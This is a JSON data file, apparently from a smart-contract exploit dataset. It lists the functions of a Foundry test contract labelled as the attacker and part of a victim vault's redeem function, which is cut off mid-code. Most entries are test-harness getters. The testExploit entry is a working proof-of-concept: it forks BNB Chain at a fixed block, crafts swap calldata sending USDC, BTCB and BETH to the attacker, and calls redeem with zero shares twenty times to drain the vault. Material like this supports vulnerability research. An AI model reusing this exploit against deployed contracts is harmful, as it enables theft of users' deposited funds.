[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 38_126_753);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        bytes[] memory dataList = new bytes[](11); //@note mock data list - unoswapTo\n        uint256[] memory pools = new uint256[](1);\n        pools[0] = uint256(\n            28_948_022_309_329_048_857_350_594_136_651_893_637_891_169_795_467_361_725_136_627_244_723_734_772_827\n        );\n        dataList[0] = abi.encodeWithSignature(\n            \"unoswapTo(address,address,uint256,uint256,uint256[])\",\n            Attacker,\n            address(USDC),\n            2_331_516_232_778_274_153_239,\n            0,\n            pools\n        );\n\n        pools[0] = uint256(\n            28_948_022_309_329_048_857_350_594_135_968_575_911_172_281_388_296_638_049_447_197_314_275_709_206_658\n        );\n        dataList[1] = abi.encodeWithSignature(\n            \"unoswapTo(address,address,uint256,uint256,uint256[])\",\n            Attacker,\n            address(BTCB),\n            16_071_737_934_381_556,\n            0,\n            pools\n        );\n\n        pools[0] = uint256(\n            28_948_022_309_329_048_857_350_594_136_076_890_004_755_093_450_729_657_598_371_073_172_666_212_569_020\n        );\n        dataList[2] = abi.encodeWithSignature(\n            \"unoswapTo(address,address,uint256,uint256,uint256[])\",\n            Attacker,\n            address(BETH),\n            256_895_663_903_293_078,\n            0,\n            pools\n        );\n\n        dataList[3] = new bytes(0);\n        dataList[4] = new bytes(0);\n        dataList[5] = new bytes(0);\n        dataList[6] = new bytes(0);\n        dataList[7] = new bytes(0);\n        dataList[8] = new bytes(0);\n        dataList[9] = new bytes(0);\n        dataList[10] = new bytes(0);\n\n        console2.log(\"Attacker BNB balance before: \", Attacker.balance);\n\n        for (uint256 i = 0; i < 20; i++) {\n            USDC.balanceOf(address(sportVault));\n            BTCB.balanceOf(address(sportVault));\n            BETH.balanceOf(address(sportVault));\n            BUSD.balanceOf(address(sportVault));\n\n            sportVault.redeem(0, address(BUSD), 0, dataList, false);\n        }\n\n        console2.log(\"Attacker BNB balance after: \", Attacker.balance);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ISportVault",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(\n        uint256 sharesToRedeem,\n        address receivingAsset,\n        uint256 minTokensToReceive,\n        bytes[] calldata dataList,\n        bool useDiscount\n    )\n    external nonReentrant\n    returns (uint256 tokensToReturn)\n    {\n        require(depositableAssets.contains(receivingAsset), \"da\");\n        TxParams memory dp;\n        (dp.aum, dp.assets, dp.prices, dp.usdValues) = _getAllocations(0);\n        dp.nav = getNav();\n        dp.nominalFinalAum = dp.aum - (dp.nav * sharesToRedeem / UNIT);\n        require(dataList.length == dp.assets.length, \"l\");\n        dp.totalSupply = totalSupply();\n        uint256 rcvTokenAccumulator =\n        (receivingAsset == NATIVE_TOKEN ? address(this).balance : ERC20(receivingAsset).balanceOf(address(this)))\n         * sharesToRedeem / dp.totalSupply;\n\n        for (uint256 i = 0; i < dp.assets.length; i++) {\n            if (dp.assets[i] == receivingAsset) {\n                continue;\n            }\n            uint256 rcvTokenSize = receivingAsset == NATIVE_TOKEN ? address(this).balance :\n                ERC20(receivingAsset).balanceOf(address(this));\n\n            if (dp.assets[i] != NATIVE_TOKEN) {\n",
    "description": ""
  }
]